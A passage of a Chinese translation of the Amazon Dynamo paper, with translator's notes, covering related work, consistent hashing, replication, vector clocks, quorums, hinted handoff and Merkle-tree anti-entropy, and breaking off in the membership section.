Peer Systems）</h3><p>一些点对点（peer-to-peer, P2P）系统关注了<strong>数据存储和分散</strong>（data storage and distribution）的问题。</p><h4 id="P2P-系统"><a href="#P2P-系统" class="headerlink" title="P2P 系统"></a>P2P 系统</h4><p>第一代 P2P 系统，例如 Freenet 和 Gnutella，在文件共享系统（file sharing system） 领域使用广泛。它们都是<strong>非受信（untrusted）P2P 网络</strong>的代表，节点之间的 overlay （网络术语，和 underlay 对应，请参考 Wikipedia 或其他资料，译者注）链路都是随机 （随意）建立的（established arbitrarily）。在这种网络中，一次查询请求通常是<strong>泛 洪（flood）到整张网络，找到尽量多的共享这个数据的节点</strong>。</p><h4 id="结构化-P2P-系统"><a href="#结构化-P2P-系统" class="headerlink" title="结构化 P2P 系统"></a>结构化 P2P 系统</h4><p>P2P 网络到下一代，就是有名的<strong>结构化 P2P 网络</strong>（structured P2P network）。这种 网络使用了全局一致性协议（globally consistent protocol），保证<strong>任何一个节点可以 高效地将查询请求路由到存储这个数据的节点</strong>。</p><p>Pastry [16] 和 Chord [20] 这样的系统<strong>利用路由机制可以保证查询在若干（有上限） 跳</strong>（a bounded number of hops）之内收到应答。</p><p>为了减少多跳（multi-hop）路由带来的额外延迟，一些 P2P 系统（例如 [14]）使用了 <strong>O(1)路由机制</strong>，在这种机制中，<strong>每个节点维护了足够多的路由信息</strong>，因此它可以 将（访问数据的）请求在常量跳数（constant number of hops）内路由到合适的对端节点 。</p><p>包括 Oceanstore [9] 和 PAST [17] 在内的很多存储系统都是构建在这种路由（routing） overlay 之上的。Oceanstore 提供全球分布的、事务型的、持久的存储服务，支持分布在 很大地理范围内的副本的串行化更新（serialized updates on widely replicated data） 。<strong>为了支持并发更新，同时避免广域锁</strong>（wide-are locking）内在的一些问题，它使用了一 种基于冲突解决（conflict resolution）的更新模型。conflict resolution 在 [21] 中 提出，用于减少事务异常中止（transaction abort）的数量。<strong>Oceanstore 处理冲突的方式是 ：对并发更新进行排序（order），将排好序的若干个更新作为原子操作应用到所有副本</strong>。 Oceanstore 是为在<strong>不受信的基础设施上做数据复制的场景</strong>设计的。</p><p>作为对比，PAST 是在 Pastry 之上提供了一个简单的抽象层，以此来提供持久和<strong>不可变对 象</strong>（persistent and immutable objects）。它假设<strong>应用可以在它之上构建自己需要的 存储语义</strong>（storage semantics）（例如可变文件）。</p><h3 id="3-2-分布式文件系统与数据库"><a href="#3-2-分布式文件系统与数据库" class="headerlink" title="3.2 分布式文件系统与数据库"></a>3.2 分布式文件系统与数据库</h3><p>文件系统和数据库系统领域已经对<strong>通过分散数据（distributing data）来提高性能、可 用性和持久性</strong>进行了广泛研究。和 <strong>P2P 存储系统只支持扁平命名空间</strong>（flat namespace）相比，<strong>典型的分布式文件系统都支持层级化的命名空间</strong>（hierarchical namespace）。</p><ul><li>Ficus [5] 和 Coda [19] 这样的系统通过文件复制来提高可用性，代价是牺牲一致性。 解决更新冲突一般都有各自特殊的解决方式</li><li>Farsite [1] 是一不使用中心式服务器（例如 NFS）的分布式文件系统，它通过复制实现 高可用和高扩展</li><li><strong>Google File System</strong> [6] 是另一个分布式文件系统，用于存储 Google 内部应用的 状态数据。GFS 的设计很简单，一个主节点（master）管理所有元数据，数据进行分片（ chunk），存储到不同数据节点（chunkservers）。</li><li>Bayou 是一个分布式关系型数据库系统，允许在失联情况下进行操作（disconnected operation），提供最终一致性</li></ul><p>在这些系统中，Bayou、Coda 和 Ficus 都支持失联情况下进行操作，因此对网络分裂和宕 机都有很强的弹性，它们的不同之处在于如何解决冲突。例如，Coda 和 Ficus 在系统层面 解决（system level conflict resolution），而 Bayou 是在应用层面（application level）。相同的是，它们都提供最终一致性。与这些系统类似，<strong>Dynamo 允许在网络发生 分裂的情况下继续执行读写操作，然后通过不同的冲突解决机制来处理更新冲突</strong>。</p><p>分布式块存储系统（distributed block storage system），例如 FAB [18]，将一个大块 分割成很多小块并以很高的可用性的方式存储。和这类系统相比，<strong>我们的场景更适合使用键 值存储</strong>，原因包括：</p><ul><li>系统定位是<strong>存储相对较小的文件</strong>（ <code>size &lt; 1 MB</code>）</li><li><strong>键值存储</strong>（key-value store）更容易在应用级别<strong>针对单个应用</strong>（per-application）进行配置</li></ul><p>Antiquity 是一个广域分布式文件系统，设计用于处理多个服务器挂掉的情况 [23]。它使 用<strong>安全日志</strong>（secure log）保证数据完整性，在不同服务器之间复制 secure log 来保 证持久性（durability），使用<strong>拜占庭容错协议</strong>（Byzantine fault tolerance protocols）保证数据一致性。与此不同，<strong>Dynamo 并不将数据完整性和安全性作为主要关 注点，因为我们面向的是受信环境</strong>。</p><p><strong>Bigtable 是一个管理结构化数据</strong>（structured data）的分布式文件系统，它维护了一 张稀疏的多维有序映射表（sparse, multi-dimensional sorted map），允许应用通过多重 属性访问它们的数据（access their data using multiple attributes） [2]。与此不同 ，<strong>Dynamo 面向的应用都是以 key&#x2F;value 方式访问数据的，我们的主要关注点是高可用</strong> ，即使在发生网络分裂或服务器宕机的情况下，写请求也是不会被拒绝的。</p><p>传统的复制型关系数据库系统（replicated relational database systems）都将关注点放 在<strong>保证副本的强一致性</strong>。虽然强一致性可以<strong>给应用的写操作提供方便的编程模型</strong>， 但导致系统的扩展性和可用性非常受限 [7]，无法处理网络分裂的情况。</p><h3 id="3-3-讨论"><a href="#3-3-讨论" class="headerlink" title="3.3 讨论"></a>3.3 讨论</h3><p>Dynamo 面临的需求使得它与前面提到的集中式存储系统都不相同。</p><p>首先，Dynamo 针对的主要是<strong>需要“永远可写的”（always writable）数据仓库的应用</strong>， 即使发生故障或并发更新，写也不应该被拒绝。对于 Amazon 的很多应用来说，这一点是非 常关键的。</p><p>第二，Dynamo 构建在<strong>受信的、单一管理域的基础设施</strong>之上。</p><p>第三，使用 Dynamo 的应用<strong>没有层级命名空间（hierarchical namespace）的需求</strong>（这是很 多文件系统的标配），也没有复杂的关系型 schema 的需求（很多传统数据库都支持）。</p><p>第四，Dynamo 是为<strong>延迟敏感型应用</strong>（latency sensitive application）设计的，至少 <code>99.9%</code> 的读写操作都要在几百毫秒内完成。为了到达如此严格的响应要求，在多节点 之间对请求进行路由的方式（被很多分布式哈希表系统使用，例如 Chord 和 Pastry ）就无法使用了。因为多跳路由会增加响应时间的抖动性，因此会增加长尾部分的延迟。 Dynamo 可以被描述为：一个<strong>零跳（zero hop）分布式哈希表（DHT）</strong>，每个节点在本地 维护了足够多的路由信息，能够将请求直接路由到合适节点。</p><h2 id="4-系统架构"><a href="#4-系统架构" class="headerlink" title="4. 系统架构"></a>4. 系统架构</h2><p>生产级别的存储系统的架构是很复杂的。除了最终存储数据的组件之外，系统还要针对下列 方面制定可扩展和健壮的解决方案：负载均衡、成员管理（membership）、故障检测、故障 恢复、副本同步、过载处理（overload handling）、状态转移、并发和任务调度、请求 marshalling、请求路由（routing）、系统监控和告警，以及配置管理。</p><p>详细描述以上提到的每一方面显然是不可能的，因此本文将关注下面几项 Dynamo 用到的分 布式系统核心技术：</p><ul><li>partitioning（分区，经哈希决定将数据存储到哪个&#x2F;些节点）</li><li>复制（replication）</li><li>版本化（versioning）</li><li>成员管理（membership）</li><li>故障处理（failure handling）</li><li>规模扩展（scaling）</li></ul><p><img src="/assets/images/dynamo-table-1.png" alt="表 1 总结了 Dynamo 使用的这些技术及每项技术的好处" loading="lazy"></p><h4 id="Partition"><a href="#Partition" class="headerlink" title="Partition"></a>Partition</h4><ul><li>技术：<strong>一致性哈希</strong></li><li>好处：增量可扩展性</li></ul><h4 id="写高可用"><a href="#写高可用" class="headerlink" title="写高可用"></a>写高可用</h4><ul><li>技术：读时协调（解决冲突）的<strong>向量时钟</strong>（vector clocks with reconciliation during reads）</li><li>好处：version size（？）和更新频率（update rates）解耦</li></ul><h4 id="短时故障处理"><a href="#短时故障处理" class="headerlink" title="短时故障处理"></a>短时故障处理</h4><ul><li>技术：<strong>宽松的选举和 hinted handoff</strong>（移交给其他节点处理，附带提示信息）</li><li>好处：部分副本不可用时，仍然可以提供高可用性和持久性</li></ul><h4 id="持久（permanent）故障恢复"><a href="#持久（permanent）故障恢复" class="headerlink" title="持久（permanent）故障恢复"></a>持久（permanent）故障恢复</h4><ul><li>技术：<strong>基于 Merkle tree 的逆熵</strong>（anti-entropy）</li><li>好处：后台同步版本不一致的副本</li></ul><h4 id="成员管理和故障检测"><a href="#成员管理和故障检测" class="headerlink" title="成员管理和故障检测"></a>成员管理和故障检测</h4><ul><li>技术：<strong>基于 Gossip 的成员管理协议和故障检测</strong></li><li>好处：保持了<strong>架构的对称性</strong>，无需一个中心组件（centralized registry）来存储成员和节点状态等信息</li></ul><h3 id="4-1-系统接口"><a href="#4-1-系统接口" class="headerlink" title="4.1 系统接口"></a>4.1 系统接口</h3><p>Dynamo 存储键值对象的接口非常简单，它提供两个操作：</p><ul><li><code>get()</code></li><li><code>put()</code></li></ul><p><code>get(key)</code> 会定位到存储系统中 <code>key</code> 对应的所有对象副本，<strong>返回对象</strong> ——可能是单个对 象，也可能是一个对象列表（有冲突情况下，包括了所有版本）—— <strong>以及一个 context（ 上下文）</strong>。</p><p><code>put(key)</code> 确定对象应该存放的位置，然后写到相应的磁盘。</p><p><code>context</code> 包含了系统中对象的元数据，例如对象的版本，<strong>对调用方是不透明的</strong>（ opaque）。<strong>上下文信息是和对象存储在一起的</strong>，这样系统很<strong>容易验证 put 请求的 context 是否合法</strong>。</p><p>Dynamo <strong>将调用方提供的 key 和对象都视为不透明的字节序列</strong>（opaque array of bytes） 。它<strong>对 key 应用 MD5 哈希得到一个 128bit 的 ID，并根据这个 ID 计算应该存储 到哪些节点</strong>。</p><blockquote><p>Dynamo treats both the key and the object supplied by the caller as an opaque array of bytes. It applies a MD5 hash on the key to generate a 128-bit identifier, which is used to determine the storage nodes that are responsible for serving the key.</p></blockquote><h3 id="4-2-数据分散（Partitioning）算法"><a href="#4-2-数据分散（Partitioning）算法" class="headerlink" title="4.2 数据分散（Partitioning）算法"></a>4.2 数据分散（Partitioning）算法</h3><p>Dynamo 的核心需求之一是：系统必须支持<strong>增量扩展</strong>（scale incrementally）。 这就要求有一种机制能够将数据分散到系统中的不同的节点（例如，以一台机器作为一个 节点的维度）上。</p><p>Dynamo 的<strong>分散方案基于一致性哈希</strong> [10]。在一致性哈希中，哈希函数的<strong>输出是一个 固定的范围，通常作为一个循环空间，或称环（ring）</strong>。<strong>每个节点都会随 机分配一个在这个循环空间内的值</strong>，这个值代表了节点在这个环上的位置。</p><p>用如下方式找到一个数据项（data item）对应的存储节点：</p><ol><li>首先对它的 key 做哈希得到一个哈希值</li><li>然后，在环上沿着顺时针方向找到第一个<strong>所带的值比这个哈希值更大的节点</strong>（前面 提到每个节点都会被分配一个值）</li></ol><p>即，每个节点要负责环上从它自己到它的下一个节点之间的区域。<strong>一致性哈希的主要好处是 ：添加或删除节点只会影响相邻的节点，其他节点不受影响。</strong></p><blockquote><p>The principle advantage of consistent hashing is that departure or arrival of a node only affects its immediate neighbors and other nodes remain unaffected.</p></blockquote><p>但是，<strong>初级的一致性哈希算法在这里是有一些问题的</strong>。 首先，给每个节点随机分配一个位置会导致数据和负载的非均匀分布。 其次，初级的一致性哈希算法没有考虑到节点的异构因素，导致性能不理想。</p><p>为了解决这些问题，Dynamo 使用了一致性哈希的一个变种（和 [10, 20] 的类似）：<strong>每个 节点并不是映射到环上的一个点，而是多个点</strong>。</p><blockquote><p>Intead of mapping a node to a single point in the circle, each node gets assigned to multiple points in the ring.</p></blockquote><p>为了实现这种设计，Dynamo 使用了<strong>虚拟节点</strong>（virtual node）的概念。一个虚拟节点 看上去和一个普通节点一样，但<strong>实际上可能管理不止一台虚拟节点</strong>。具体来说， <strong>当一个新节点添加到系统后，它会在环上被分配多个位置（对应多个 token）</strong>。 我们会在 Section 6 介绍 Dynamo 分散策略（算法）的深入调优 。</p><p><strong>虚拟节点可以代来如下好处</strong>：</p><ol><li>当一个节点不可用时（故障或例行维护），这个节点的负载会均匀分散到其他可用节点上</li><li>当一个节点重新可用时，或新加入一个节点时，这个节点会获得与其他节点大致相同的 负载</li><li>一个节点负责的虚拟节点的数量可用根据节点容量来决定，这样可用充分利用物理基础 设施中的异构性信息</li></ol><h3 id="4-3-数据复制（Replication）"><a href="#4-3-数据复制（Replication）" class="headerlink" title="4.3 数据复制（Replication）"></a>4.3 数据复制（Replication）</h3><p>为了实现高可用性和持久性，Dynamo 将数据复制到多台机器上。每个数据会被复制到 N 台 机器，这里的 N 是每套 Dynamo 可以自己配置的。</p><p>上节介绍到，**每个 key k，会被分配一个 coordinator（协调者）**节点。 coordinator <strong>负责落到它管理的范围内的数据的复制</strong>。它除了自己存储一份之外，还会 在环上顺时针方向的其他 <code>N-1</code> 个节点存储一份副本。因此在系统中，每个节点要负责从 它自己往后的一共 N 个节点。</p><p>例如，图 2 中，B 除了自己存储一份之外，还会将其复制到 C 和 D 节点。因此，D 实际 存储的数据，其 key 的范围包括 <code>(A, B]</code>、<code>(B, C]</code> 和 <code>(C, D]</code>（例如，落在 <code>(A, B]</code> 范围内的 key 会沿顺时针方向找到第一个值比它大的节点，因此找到的是 B，而 B 会 将自己存储的数据复制到 C 和 D，因此 D 会包含 key 在 <code>(A, B]</code> 范围内的对象。其他 几个范围也是类似的。译者注）。</p><p><img src="/assets/images/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）" loading="lazy"></p><p>存储某个特定 key 的所有节点组成一个列表，称为 <strong>preference list</strong>（优先列表）。 我们在 4.8 节会看到，Dynamo 的设计是，<strong>对于给定的 key，每个节点都能决定哪些 节点可以进入这个列表</strong>。<strong>为了应对节点失败的情况，preference list 会包含多余 N 个节 点</strong>。</p><p>另外注意，由于我们引入了虚拟节点，存储一个 key 的 N 个节点，实际上对应的物理节 点可能少于 N 个（例如，一个节点可能会占用环上的不止一个节点）。为了避免这个问题 ，<strong>preference list 在选择节点的时候会跳过一些位置，以保证 list 里面的节点都在不 同的物理节点上</strong>。</p><h3 id="4-4-数据版本化（Data-Versioning）"><a href="#4-4-数据版本化（Data-Versioning）" class="headerlink" title="4.4 数据版本化（Data Versioning）"></a>4.4 数据版本化（Data Versioning）</h3><p>Dynamo 提供最终一致性，所有更新操作会异步地传递给所有的副本。</p><p><code>put()</code> 操作返回时，数据（更新）可能还没有应用到所有副本，因此紧接着的 <code>get()</code> 操作可能获取不到最新数据。在没有故障的情况下，传递更新的耗时有一个上限；但在特定 故障场景下（例如服务器宕机或网络分裂），更新可能会在限定的时间内无法传递到所有副 本。</p><p>Amazon 有些应用是可以容忍这种不一致性的，应用在这种情况下能继续运行。例如，购物 车应用要求“添加到购物车”的请求永远不能被丢失或拒绝。如果购物车的最新状态不可用， 而用户对一个稍老版本的购物车状态做了修改，那这种修改也是有意义的，需要保留；但它 不能直接覆盖最新的状态，因为最新的状态中可能也有一些修改需要保留。这里要注意，不 管是“添加到购物车”还是“从购物车删除”，在系统中转换成的都是 Dynamo 的 <code>put()</code> 操作 。如果最新的状态不可用，而用户又基于稍的大版本做了修改，那这两个版本都需要保留， 由随后的步骤来处理更新冲突。</p><h4 id="如何解决更新冲突"><a href="#如何解决更新冲突" class="headerlink" title="如何解决更新冲突"></a>如何解决更新冲突</h4><p>为了满足以上需求，Dynamo <strong>将每次修改结果都作为一个新的、不可变的版本</strong>。</p><blockquote><p>Dynamo treats the result of each modification as a new and immutable version of the data.</p></blockquote><p>即，允许系统中同时存在多个不同版本。</p><h5 id="冲突调和（使一致化）方式"><a href="#冲突调和（使一致化）方式" class="headerlink" title="冲突调和（使一致化）方式"></a>冲突调和（使一致化）方式</h5><ul><li>syntactic reconciliation（<strong>基于句法的调和</strong>）</li><li>semantic reconciliation（<strong>基于语义的调和</strong>）</li></ul><p>在<strong>大部分情况下，新版本都包含老版本的数据，而且系统自己可以判断哪个是权威版本</strong> （syntactic reconciliation）。</p><p>但是，在发生故障并且存在并发更新的场景下，版本会发生分叉（version branching）， 导致冲突的对象版本。<strong>系统本身无法处理这种情况，需要客户端介入，将多个分支合并成 一个</strong>（semantic reconciliation）。一个典型的例子是：合并多个不同版本的购物车。 有了这种调和机制（reconciliation mechanism），“添加到购物车”操作就永远不会失败 ；但是，这种情况会导致<strong>已经删除的商品偶尔又在购物车中冒出来</strong>（resurface）。</p><p>有很重要的一点需要注意：某些故障模式（failure mode）会导致存在多个冲突的版本，而 不仅仅是两个。服务器故障或网络分裂会导致一个对象有多个版本，每个版本有各自的子历 史（version sub-histories），随后要由系统来将它们一致化。这需要<strong>将应用 设计为：显式承认多版本存在的可能性（以避免丢失任何更新）</strong></p><h5 id="向量时钟"><a href="#向量时钟" class="headerlink" title="向量时钟"></a>向量时钟</h5><p><strong>Dynamo 使用向量时钟（vector clock）[12] 来跟踪同一对象不同版本之间的因果性</strong>。 一个向量时钟就是一个 <code>(node, counter)</code> 列表。一个向量时钟关联了一个对象的所有版 本，可以通过它来判断对象的两个版本是否在并行的分支上，或者它们是否有因果关系。 <strong>如果对象的第一个时钟上的所有 counter 都小于它的第二个时钟上的 counter，那第一个 时钟就是第二的祖先，可以安全的删除；否则，这两个修改就是有冲突的，需要 reconciliation</strong>。</p><p>在 Dynamo 中，<strong>客户端更新一个对象时，必须指明基于哪个版本进行更新</strong>。流程是先执 行读操作，拿到 context，其中包含了 vector clock 信息，然后写的时候带上这个 context。</p><p>在处理读请求的时候，如果 Dynamo 能够访问到多个版本，并且无法 reconcile 这些版本 ，那它就会返回所有版本，并在 context 中附带各自的 vector clock 信息。 <strong>基于 context 指定版本更新的方式解决了冲突</strong>，将多个分支重新合并为一个唯 一的新分支。</p><blockquote><p>An update using this context is considered to have reconciled the divergent versions and the branches are collapsed into a single new version.</p></blockquote><h4 id="一个具体例子"><a href="#一个具体例子" class="headerlink" title="一个具体例子"></a>一个具体例子</h4><p>我们通过 图 3 来展示 vector clock 是如何工作的。</p><p><img src="/assets/images/dynamo-figure-3.png" alt="图 3 一个对象在一段时间内的版本演进" loading="lazy"></p><p>首先，客户端写入一个对象。处理这个 key 的写请求的节点 <code>Sx</code> 增加 key 的序列号（计 数），并用这个序列号创建对象的 vector clock。至此，系统有了一个对象 <code>D1</code> 和它的 时钟 <code>[(Sx, 1)]</code>。</p><p>第二步，客户端更新这个对象。假设还是 <code>Sx</code> 处理这个请求。此时，系统有了对象 <code>D2</code> 和它的时钟 <code>[(Sx, 2)]</code>。<code>D2</code> 是 <code>D1</code> 的后代，因此可以覆盖 <code>D1</code>；<strong>但是，D1 在 其他节点上的副本可能还没有看到 D2 这次更新</strong>。</p><p>第三步，假设还是这个客户端，再次更新了对象，并且这次是由另外的一个节点 <code>Sy</code> 处理 请求。此时，系统有了 <code>D3</code> 和它的时钟 <code>[(Sx, 2), (Sy, 1)]</code>.</p><p>接下来，假设另一个客户端读取 <code>D2</code>，并尝试更新它，写请求由另一个节点 <code>Sz</code> 处理。 现在，系统有 <code>D4</code>（<code>D2</code> 的后代），版本 clock 是 <code>[(Sx, 2), (Sz, 1)]</code>。如果一个节 点知道 <code>D1</code> 和 <code>D2</code>，那它收到 <code>D4</code> 和它的 clock 后，就可以断定 <code>D1</code> 和 <code>D2</code> 被同 一个新数据覆盖了，因此可以安全地删除 D1 和 D2。但如果一个节点只知道 <code>D3</code>，那它受 到 <code>D4</code> 后就看不出这两个版本有何因果关系。<strong>换言之，D3 和 D4 各自的改动并没 有反映在对方之中。因此这两个版本都应当被保留，然后交给客户端，由客户端（在下一次 读到时候）执行 semantic reconciliation</strong>。</p><p>现在，假设一些客户端把 <code>D3</code> 和 <code>D4</code> 都读到了（<code>context</code> 会同时显示 <code>D3</code> 和 <code>D4</code> ）。读操作返回的 <code>context</code> 综合了 <code>D3</code> 和 <code>D4</code> 的 clock，即 <code>[(Sx, 2), (Sy, 1), (Sz, 1)]</code>。如果客户端执行 reconciliation，并且节点 <code>Sx</code> 执行协调写（coordinates the write），<code>Sx</code> 会更新自己在 clock 中的序列号。最终新生成的数据 <code>D5</code> 的 clock 格式如下：<code>[(Sx, 3), (Sy, 1), (Sz, 1)]</code>。</p><h4 id="Vector-clock-的潜在问题"><a href="#Vector-clock-的潜在问题" class="headerlink" title="Vector clock 的潜在问题"></a>Vector clock 的潜在问题</h4><p>vector clock 的一个潜在问题是：<strong>如果有多个节点先后 coordinate 同一个对象 的写操作，那这个对象的 clock vector 会变得很长</strong>。但在实际中这不太可能发生，因为 写操作 coordination 只会由 preference list 中前 N 个 节点中的一个来执行。 只有在网络分裂或多台服务器挂掉的情况下，写操作才可能由非 preference list 前 N 个 节点来执行，导致 vector clock 变长。在这种情况下，应该要限制 vector clock 的长度 。</p><p>Dynamo 采用了一种 clock 截断方案（clock truncation scheme）： 另外保存一个和 <code>(node, counter)</code> 对应的时间戳，记录对应的节点最后一次更新该记录 的时间。当 vector clock 里的 <code>(node, counter)</code> 数量达到一个阈值（例如，10）时， 就删除最老的一项。</p><p>显然，这种截断方案会给 reconciliation 带来一定问题，因为截断后可能无法精确判断部 分后代的因果关系。但到目前为止，我们还没有在生产环境遇到这个问题，因此没有继续深 入研究下去。</p><h3 id="4-5-get-和-put-的执行过程"><a href="#4-5-get-和-put-的执行过程" class="headerlink" title="4.5 get() 和 put() 的执行过程"></a>4.5 <code>get()</code> 和 <code>put()</code> 的执行过程</h3><p><strong>在 Dynamo 中，任何存储节点都可以接受任何 key 的 get 和 put 操作请求</strong>。</p><blockquote><p>Any storage node in Dynamo is eligible to receive client get and put operations for any key.</p></blockquote><p>本节先介绍在无故障场景下这些操作是如何执行的，下一节介绍有故障的场景。</p><p><code>get</code> 和 <code>put</code> 操作由 Amazon 基础设施相关的请求处理框架发起，使用 HTTP。 客户端有两种选择：</p><ol><li>将请求路由到负载均衡器，由后者根据负载信息选择一个后端节点</li><li>使用能感知 partition 的客户端，直接将请求路由到某 coordinator 节点</li></ol><p>第一种方式的好处是使用客户端的应用不需要了解任何 Dynamo 相关的代码，第二种的好处 是延迟更低，因为跳过了一次潜在的转发步骤。</p><p><strong>负责处理读或写请求的节点称为 coordinator</strong>。<strong>通常情况下</strong>，这是 preference list 内前 N 个节点中的<strong>第一个节点</strong>。如果请求是经过负载均衡器转发的，那这个请求 可能会被转发到环上的任意一个节点。在这种情况下，如果收到请求的节点不是 preference list 的 前 N 个节点中的一个，那它就不会处理这个请求，而是将其转发到 preference list 前 N 个节点中的第一个节点。</p><p><strong>读或写操作需要 preference list 中前 N 个节点处于健康状态</strong>，如果有 down 或不可 访问状态的节点，要跳过。如果所有节点都是健康的，那就取 preference list 的前 N 个 节点。如果发生节点故障或网络分裂，优先访问 preference list 中编号较小的节点。</p><h4 id="读写操作仲裁算法"><a href="#读写操作仲裁算法" class="headerlink" title="读写操作仲裁算法"></a>读写操作仲裁算法</h4><p>为了保证副本的一致性，Dynamo 使用了一种类似仲裁系统（quorum systems）的一致性协议。 这个协议有两个配置参数：<code>R</code> 和 <code>W</code>：</p><ul><li><code>R</code>：允许执行一次读操作所需的最少投票者</li><li><code>W</code>：允许执行一次写操作所需的最少投票者</li></ul><p><strong>设置 R + W &gt; N</strong>（<code>R</code> 或 <code>W</code> 至少有一个超过半数 N&#x2F;2，译者注），<strong>就得到了一 个类似仲裁的系统</strong>。</p><p>在这种模型下，一次 <code>get</code> （或 <code>put</code>）的延迟由 <code>R</code>（或 <code>W</code>）个<strong>副本中最慢的一个决 定</strong>。因此，为了降低延迟，<code>R</code> 和 <code>W</code> 通常设置的比 <code>N</code> 小。</p><h4 id="写和读过程"><a href="#写和读过程" class="headerlink" title="写和读过程"></a>写和读过程</h4><p>当收到一个 <code>put()</code> 请求后，coordinator 会为新版本生成 vector clock，并将其保存到 节点本地；然后，将新版本（及对应的新 vector clock）发送给 N 个排在最前面的、可到 达的节点。只要有至少 <code>W-1</code> 个节点返回成功，这次写操作就认为是成功了。</p><p>类似地，对于一次 <code>get()</code> 请求，coordinator 会向排在最前面的 N 个（highest-ranked ）可访问的节点请求这个 key 对应的数据的版本，等到 R 个响应之后，就将结果返回给客 户端。如果 coordinator 收集到了多个版本，它会<strong>将所有它认为没有因果关系的版本返 回给客户端</strong>。客户端需要对版本进行 reconcile，合并成一个最新版本，然后将结果写回 Dynamo。</p><h3 id="4-6-短时故障处理-Hinted-Handoff（移交给其他节点临时保存）"><a href="#4-6-短时故障处理-Hinted-Handoff（移交给其他节点临时保存）" class="headerlink" title="4.6 短时故障处理: Hinted Handoff（移交给其他节点临时保存）"></a>4.6 短时故障处理: Hinted Handoff（移交给其他节点临时保存）</h3><p>如果使用传统仲裁算法，Dynamo 无法在服务器宕机或网络分裂的时候仍然保持可用，而且 在遇到最简单故障情况下，持久性（durability）也会降低。</p><p>因此，Dynamo 采用了一种<strong>宽松的仲裁机制</strong>（sloppy quorum）：<strong>所有读和写操作在 preference list 的前 N 个健康节点上执行</strong>；注意这 N 个节点不一定就是前 N 个节点， 因为遇到不健康的节点，会沿着一致性哈希环的顺时针方向顺延。</p><p><img src="/assets/images/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）" loading="lazy"></p><p>以图 2 的配置为例，其中 N&#x3D;3。<strong>如果 A 临时不可用，正常情况下应该到达 A 的写请求就 会发送到 D</strong>。这样设计是为了保证期望达到的可用性和持久性。<strong>发送到 D 的副本的元 数据中会提示（hint）这个副本本来应该发送给谁</strong>（这里是 A），然后这个数据会被 D 保存到本地的一个独立数据库中，并且有一个<strong>定期任务不断扫描，一旦 A 可用了，就将 这个数据发送回 A</strong>，然后 D 就可以从本地数据库中将其删除了，这样系统内的副本数还 是保持不变。</p><p>使用这种 hinted handoff 的方式，Dynamo <strong>保证了在节点或网络发生短时故障时读和写 操作不会失败</strong>。希望可用性最高的应用可以将 <code>W</code> 设为 1，这样可以保证只要一个节点 完成写，这次写操作就被系统接受了。在这种情况下，除非全部节点都不可用，否则写操作 就不会被拒绝。但实际上，大部分 Amazon 的应用都是设置一个比 1 大的值，以达到期望 的持久性（durability）等级。我们会在第 6 节更深入地讨论 <code>N</code>、<code>R</code> 和 <code>W</code> 的配置。</p><p><strong>高度可用的存储系统必须能够处理整个数据中心挂掉的情况。<strong>掉电、制冷失效、网络故 障以及自然灾难都会导致整个数据中心发生故障。Dynamo 可以配置</strong>向多个数据中心同步 副本</strong>，只要<strong>将 preference list 里的节点分散到不同数据中心</strong>。这些数据中心之间 通过高速网络互连。这使得我们可以在整个数据中心挂掉的情况下仍然可以提供服务。</p><h3 id="4-7-持久（permanent）故障处理-副本跨数据中心同步"><a href="#4-7-持久（permanent）故障处理-副本跨数据中心同步" class="headerlink" title="4.7 持久（permanent）故障处理: 副本跨数据中心同步"></a>4.7 持久（permanent）故障处理: 副本跨数据中心同步</h3><p>在节点成员变动较小、节点故障只是短时的情况下，hinted handoff 方式工作良好。但也 有一些场景，在 hinted 副本移交给原本应该存储这个副本的节点之前，该副本就不可用了 。为了解决这个问题，以及其他威胁到持久性（durability）的场景，Dynamo 实现了一种 <strong>逆熵（副本同步）协议</strong>来<strong>保证副本是同步的</strong>。</p><blockquote><p>To handle this and other threats to durability, Dynamo implements an anti-entropy (replica synchronization) protocol to keep the replicas synchronized.</p></blockquote><h4 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h4><p>为了实现<strong>快速检测副本之间的不一致性，以及最小化转移的数据量</strong>，Dynamo 使用了 Merkle trees [13].</p><p>一个 Merkle tree 就是一个<strong>哈希树</strong>，其叶子节点是 <strong>key 对应的 value 的哈希值</strong>。 <strong>父节点是其子节点的哈希</strong>。</p><p>Merkle tree 的主要优点是：</p><ul><li>每个分支都可以独立查看（check），节点无需下载整棵树或者整个数据集</li><li>减少检查副本一致性时所需传输的数据量</li></ul><p><strong>例如，如果两棵树的根节点的哈希值相同，那这两棵树的叶子节点必然相同，这两台 node 之间就无需任何同步</strong>；否则，就说明两台 node 之间的某些副本是不同的，这种情 况下两台 node 就需要交换树的子节点哈希值，直到到达叶子节点，就找到了未同步（out of sync）的 key。Merkle tree 最小化了同步时需要转移的数据量，<strong>减少了逆熵过程中 读取磁盘的次数</strong>。</p><p>Dynamo 使用 Merkle tree 实现<strong>逆熵的过程</strong>如下：<strong>每个节点为每段 key range（一台 虚拟节点所覆盖的 key 的范围）维护了一棵单独的 Merkle tree</strong>。</p><p>这使得节点之间可以比较 key range，确定其维护的 range 内的 key 是否是最新的（up to date）。在这种方案中，两个节点会交换他们都有的 key range 所对应的 Merkle tree 的 根节点。然后，基于前面提到的树遍历方式， node 可以判断是是否有不一致，如果有，就 执行同步。</p><p>这种方案的缺点是：<strong>每当有节点加入或离开系统时，一些 key range 会变，因此对应的 tree 需要重新计算</strong>。我们会在 6.2 节介绍如何通过改进的 partitioning scheme 解决 这个问题。</p><h3 id="4-8-节点成员（Membership）管理和故障检测"><a href="#4-8-节点成员（Membership）管理和故障检测" class="headerlink" title="4.8 节点成员（Membership）管理和故障检测"></a>4.8 节点成员（Membership）管理和故障检测</h3><h4 id="4-8-1-哈希环（ring）成员"><a href="#4-8-1-哈希环（ring）成员" class="headerlink" title="4.8.1 哈希环（ring）成员"></a>4.8.1 哈希环（ring）成员</h4><p>在 Amazon 的环境中，节点服务不可用（故障或维护导致的）通常情况下持续时间都很短， 但也存在中断比较长的情况。一个节点服务中断并不能说明这个节点永久性的离开了系统， 因此不应该导致系统对 partition 进行再平衡（rebalance），或者修复无法访问的副本。 与此类似，无意的手动操作可能导致新的节点加入到 Dynamo。</p><p>因此，为了避免以上这些问题，我们决定<strong>使用显式机制（explicit mechanism）来向 Dynamo Ring 增删节点</strong>。管理员通过命令行或 web 方式连接到 Dynamo node，然后下发 一个成员变更命令，来将这个 node 添加到 ring 或从 ring 